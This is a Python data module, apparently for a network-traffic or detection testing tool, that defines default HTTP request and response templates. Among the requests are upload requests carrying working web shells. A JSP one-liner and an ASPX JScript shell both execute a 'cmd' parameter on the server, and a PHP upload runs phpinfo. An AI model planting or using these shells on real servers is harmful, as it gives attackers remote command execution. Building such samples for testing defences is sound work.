"""
    添加默认请求/响应时的数据
"""
from random import *
from datetime import datetime

default_req_dict = {
    "默认GET": "GET /index.html?index=1 HTTP/1.1\r\nHost: 192.168.57.160\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n",
    "默认POST": "POST /index.html HTTP/1.1\r\nHost: 192.168.48.147\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\r\nConnection: close\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 30\r\n\r\nusername=admin&password=123456",
    "默认上传PHP一句话": 'POST /upload.php HTTP/1.1\r\nHost: 192.168.36.152\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\r\nConnection: keep-alive\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarygfd0H3RWDeNNLaPy\r\nContent-Length: 194\r\n\r\n------WebKitFormBoundarye776qKJKlcGtVlH5\r\nContent-Disposition: form-data; name="file"; filename="1.php"\r\nContent-Type: image/png\r\n\r\n<?php phpinfo();?>\r\n------WebKitFormBoundarye776qKJKlcGtVlH5--',
    "默认上传JSP一句话": 'POST /upload HTTP/1.1\r\nHost: 192.168.25.174\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: JSESSIONID=3643f3f44448080317dcefa4d4f958e8\r\nContent-Type: multipart/form-data; boundary=----21909179191068471382830692394\r\nConnection: close\r\nContent-Length: 247\r\n\r\n------21909179191068471382830692394\r\nContent-Disposition: form-data; name="files"; filename="2.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<% Process process = Runtime.getRuntime().exec(request.getParameter("cmd")); %>\r\n------21909179191068471382830692394--',
    "默认上传ASP一句话": 'POST /FileUpload.aspx HTTP/1.1\r\nHost: 192.168.14.213\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,\r\nX-Requested-With: XMLHttpRequest\r\nContent-Type: multipart/form-data; boundary=----21909179191068471382830692394\r\nConnection: close\r\nContent-Length: 684\r\n\r\n------21909179191068471382830692394\r\nContent-Disposition: form-data; name="File"; filename="shell.aspx"\r\nContent-Type: image/jpeg\r\n\r\n<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>\r\n------21909179191068471382830692394--',
    "随机TCP请求（长度100）": "".join([choice("0123456789abcdef") for i in range(200)])
}

default_rsp_dict = {
    "默认响应（200）": f"HTTP/1.1 200 OK\r\nCache-Control: private\r\nContent-Type: text/html; charset=utf-8\r\nServer: nginx\r\nDate: {datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')}\r\nContent-Length: 6\r\nConnection: close\r\n\r\nhidden",
    "默认响应（404）": "",
    "默认响应（500）": "",
    "响应phpinfo": "",
    "响应/etc/passwd": "",
    "响应id命令执行结果": "",
    "随机TCP响应（长度100）": "".join([choice("0123456789abcdef") for i in range(200)])
}
